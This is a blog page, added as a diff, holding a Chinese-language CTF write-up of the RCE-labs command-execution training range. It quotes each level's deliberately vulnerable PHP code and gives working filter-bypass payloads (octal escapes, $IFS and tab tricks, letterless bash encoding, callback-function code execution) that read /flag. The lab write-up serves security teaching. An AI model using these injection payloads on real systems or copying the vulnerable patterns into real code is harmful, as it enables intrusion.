@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Chain Mirror Platform 靶场 RCE 系列（RCELABS）题解与利用链记录。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chain Mirror Platform 题解">
+<meta property="og:url" content="https://xendr1a.github.io/2026/04/02/chain-mirror/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="Chain Mirror Platform 靶场 RCE 系列（RCELABS）题解与利用链记录。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-02T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.953Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Chain Mirror Platform 题解 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">Chain Mirror Platform 题解</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-02 10:00" pubdate>
+          2026年4月2日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.6k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Chain Mirror Platform 题解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="RCELABS-11"><a href="#RCELABS-11" class="headerlink" title="RCELABS-11"></a>RCELABS-11</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php <br>/*<br># -*- coding: utf-8 -*-<br># @Author: 探姬<br># @Date:   2024-08-11 14:34<br># @Repo:   github.com/ProbiusOfficial/RCE-labs<br># @email:  admin@hello-ctf.com<br># @link:   hello-ctf.com<br><br>--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_数字1的特殊变量替换 --- <br><br>题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck<br>你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/<br>题目本身也提供一个/exp.php方便你使用<br><br>本关卡的考点为终端中支持 $((2#binary)) 解析二进制数据 + 我们用 $&#123;##&#125; 来替换 1 <br><br>*/<br><br>function hello_shell($cmd)&#123;<br>    if(preg_match(&quot;/[A-Za-z1-9\&quot;%*+,-.\/:;=&gt;?@[]^`|]/&quot;, $cmd))&#123;<br>        die(&quot;WAF!&quot;);<br>    &#125;<br>    system($cmd);<br>&#125;<br><br>isset($_POST[&#x27;cmd&#x27;]) ? hello_shell($_POST[&#x27;cmd&#x27;]) : null;<br><br>highlight_file(__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">用给的工具直接生成了<br>cmd=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;00))\&#x27;<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCELABS-14"><a href="#RCELABS-14" class="headerlink" title="RCELABS-14"></a>RCELABS-14</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php <br>/*<br># -*- coding: utf-8 -*-<br># @Author: 探姬<br># @Date:   2024-08-11 14:34<br># @Repo:   github.com/ProbiusOfficial/RCE-labs<br># @email:  admin@hello-ctf.com<br># @link:   hello-ctf.com<br><br>--- HelloCTF - RCE靶场 : 命令执行 - 长度限制_7字符RCE --- <br><br>*/<br><br>if(strlen($_GET[1]&lt;8))&#123;<br>    echo strlen($_GET[1]);<br>    echo &#x27;&lt;hr/&gt;&#x27;;<br>    echo shell_exec($_GET[1]);<br>&#125;else&#123;<br>    exit(&#x27;too long&#x27;);<br>&#125;<br><br>highlight_file(__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">7字符串绕过以前遇到过了<br>?1=cat /f*<br>?1=nl /*<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCELABS-2"><a href="#RCELABS-2" class="headerlink" title="RCELABS-2"></a>RCELABS-2</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs text"> &lt;?php<br>include (&quot;get_flag.php&quot;);<br>global $flag;<br><br>session_start(); // 开启 session<br>/*<br># -*- coding: utf-8 -*-<br># @Author: 探姬<br># @Date:   2024-08-11 14:34<br># @Repo:   github.com/ProbiusOfficial/RCE-labs<br># @email:  admin@hello-ctf.com<br># @link:   hello-ctf.com<br><br>--- HelloCTF - RCE靶场 : PHP代码执行函数 --- <br><br>除开在一句话木马中最受欢迎用以直接执行PHP代码的 eval() 函数，PHP还有许多 回调函数 也可以直接或者间接的执行PHP代码。<br><br>在该关卡中，你将会从能够执行代码的PHP函数中抽取一个，你需要填充函数的内容来执行某些代码以获取flag（tip:flag存储在 $flag 中,当然你也可以尝试其他方法）。<br><br>*/<br>function hello_ctf($function, $content)&#123;<br>    global $flag;<br>    $code = $function . &quot;(&quot; . $content . &quot;);&quot;;<br>    echo &quot;Your Code: $code &lt;br&gt;&quot;;<br>    eval($code);<br>&#125;<br><br>function get_fun()&#123;<br><br>    $func_list = [&#x27;eval&#x27;,&#x27;assert&#x27;,&#x27;call_user_func&#x27;,&#x27;create_function&#x27;,&#x27;array_map&#x27;,&#x27;call_user_func_array&#x27;,&#x27;usort&#x27;,&#x27;array_filter&#x27;,&#x27;array_reduce&#x27;,&#x27;preg_replace&#x27;];<br><br>    if (!isset($_SESSION[&#x27;random_func&#x27;])) &#123;<br>        $_SESSION[&#x27;random_func&#x27;] = $func_list[array_rand($func_list)];<br>    &#125;<br>    <br>    $random_func = $_SESSION[&#x27;random_func&#x27;];<br><br>    $url_fucn = preg_replace(&#x27;/_/&#x27;, &#x27;-&#x27;, $_SESSION[&#x27;random_func&#x27;]);<br>    <br>    echo &quot;获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.&quot;.$url_fucn.&quot;.php 查看函数详情。&lt;br&gt;&quot;;<br><br>    return $_SESSION[&#x27;random_func&#x27;];<br>&#125;<br><br>function start($act)&#123;<br><br>    $random_func = get_fun();<br>    <br>    if($act == &quot;r&quot;)&#123; /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */<br>        session_unset();<br>        session_destroy(); <br>    &#125;<br><br>    if ($act == &quot;submit&quot;)&#123;<br>        $user_content = $_POST[&#x27;content&#x27;]; <br>        hello_ctf($random_func, $user_content);<br>    &#125;<br>&#125;<br><br>isset($_GET[&#x27;action&#x27;]) ? start($_GET[&#x27;action&#x27;]) : &#x27;&#x27;;<br><br>highlight_file(__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">eval()  system(&quot;ls&quot;);<br>call_user_func_array()  &#x27;system&#x27;, [&#x27;ls&#x27;]<br>call_user_func()   &#x27;system&#x27;, &#x27;ls&#x27;<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCELABS-6"><a href="#RCELABS-6" class="headerlink" title="RCELABS-6"></a>RCELABS-6</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php <br>/*<br># -*- coding: utf-8 -*-<br># @Author: 探姬<br># @Date:   2024-08-11 14:34<br># @Repo:   github.com/ProbiusOfficial/RCE-labs<br># @email:  admin@hello-ctf.com<br># @link:   hello-ctf.com<br><br>--- HelloCTF - RCE靶场 : 挑战关 --- <br><br>刚才，学了什么来着！？<br><br>*/<br><br>function hello_shell($cmd)&#123;<br>    if(preg_match(&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;[]]/&quot;, $cmd))&#123;<br>        die(&quot;WAF!&quot;);<br>    &#125;<br>    system($cmd);<br>&#125;<br><br>isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null;<br><br>highlight_file(__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">八进制绕过<br>?cmd=$&#x27;\057\142\151\156\057\143\141\164&#x27; $&#x27;\057\146\154\141\147&#x27;<br>等于 ?cmd=/bin/cat /flag<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCELABS-7"><a href="#RCELABS-7" class="headerlink" title="RCELABS-7"></a>RCELABS-7</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs text"> &lt;?php <br>/*<br># -*- coding: utf-8 -*-<br># @Author: 探姬<br># @Date:   2024-08-11 14:34<br># @Repo:   github.com/ProbiusOfficial/RCE-labs<br># @email:  admin@hello-ctf.com<br># @link:   hello-ctf.com<br><br>--- HelloCTF - RCE靶场 : 命令执行 - 终端特殊字符 --- <br><br>在遇到空格被过滤的情况下，通常使用 %09 也就是TAB的URL编码来绕过，在终端环境下 空格 被视为一个命令分隔符，本质上由 $IFS 变量控制，而 $IFS 的默认值是空格、制表符和换行符，所以我们还可以通过直接键入 $IFS 来绕过空格过滤。<br><br>*/<br><br>function hello_shell($cmd)&#123;<br>    if(preg_match(&quot;/flag| /&quot;, $cmd))&#123;<br>        die(&quot;WAF!&quot;);<br>    &#125;<br>    system($cmd);<br>&#125;<br><br>isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null;<br><br>highlight_file(__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">根据提示绕过<br>?cmd=cat$IFS/f*<br>?cmd=cat$&#123;IFS&#125;/f*<br>?cmd=cat%09/f*<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCELABS-8"><a href="#RCELABS-8" class="headerlink" title="RCELABS-8"></a>RCELABS-8</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php <br>/*<br># -*- coding: utf-8 -*-<br># @Author: 探姬<br># @Date:   2024-08-11 14:34<br># @Repo:   github.com/ProbiusOfficial/RCE-labs<br># @email:  admin@hello-ctf.com<br># @link:   hello-ctf.com<br><br>--- HelloCTF - RCE靶场 : 命令执行 - 重定向 --- <br><br>大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端 —— 这些是命令有回显的基础。<br><br>如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：<br>$ command &gt; /dev/null<br><br>/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到&quot;禁止输出&quot;的效果。<br>如果希望屏蔽 stdout 和 stderr，可以这样写：<br>$ command &gt; /dev/null 2&gt;&amp;1<br><br>*/<br><br>function hello_shell($cmd)&#123;<br>    /*&gt;/dev/null 将不会有任何回显，但会回显错误，加上 2&gt;&amp;1 后连错误也会被屏蔽掉*/<br>    system($cmd.&quot;&gt;/dev/null 2&gt;&amp;1&quot;);<br>&#125;<br><br>isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null;<br><br>highlight_file(__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">用;隔开就行<br>?cmd=cat /f*;<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCELABS-9"><a href="#RCELABS-9" class="headerlink" title="RCELABS-9"></a>RCELABS-9</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php <br>/*<br># -*- coding: utf-8 -*-<br># @Author: 探姬<br># @Date:   2024-08-11 14:34<br># @Repo:   github.com/ProbiusOfficial/RCE-labs<br># @email:  admin@hello-ctf.com<br># @link:   hello-ctf.com<br><br>--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_八进制转义 ---<br><br>题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck<br>你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/<br>题目本身也提供一个/exp.php方便你使用<br><br>从该关卡开始你会发现我们在Dockerfile中添加了一行改动：<br><br>RUN ln -sf /bin/bash /bin/sh<br><br>这是由于在PHP中，system是执行sh的，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，我们用的底层镜像 php:7.3-fpm-alpine 默认指向的 /bin/busybox ，要验证这一点，你可以对 /bin/sh 使用 ls -l 命令查看，在这个容器中，你会得到下面的回显：<br>bash-5.1# ls -l /bin/sh<br>lrwxrwxrwx    1 root     root            12 Mar 16  2022 /bin/sh -&gt; /bin/busybox<br><br>我们需要用到的特性只有bash才支持，请记住这一点，这也是我们手动修改指向的原因。<br><br>在这个关卡主要利用的是在终端中，$&#x27;\xxx&#x27;可以将八进制ascii码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为$&#x27;\xxx\xxx\xxx\xxx&#x27;的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。<br>比如&quot;ls -l&quot;也就是$&#x27;\154\163\40\55\154&#x27; 只能拆分为$&#x27;\154\163&#x27; 空格 $&#x27;\55\154&#x27;三部分。<br><br>bash-5.1# $&#x27;\154\163\40\55\154&#x27;<br>bash: ls -l: command not found<br><br>bash-5.1# $&#x27;\154\163&#x27; $&#x27;\55\154&#x27;<br>total 4<br>-rw-r--r--    1 www-data www-data       829 Aug 14 19:39 index.php<br><br>*/<br><br>function hello_shell($cmd)&#123;<br>    if(preg_match(&quot;/[A-Za-z\&quot;%*+,-.\/:;=&gt;?@[]^`|]/&quot;, $cmd))&#123;<br>        die(&quot;WAF!&quot;);<br>    &#125;<br>    system($cmd);<br>&#125;<br><br>isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null;<br><br>highlight_file(__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?cmd=$&#x27;\143\141\164&#x27;%09$&#x27;\57\146\154\141\147&#x27;<br>//注意空格的连接<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
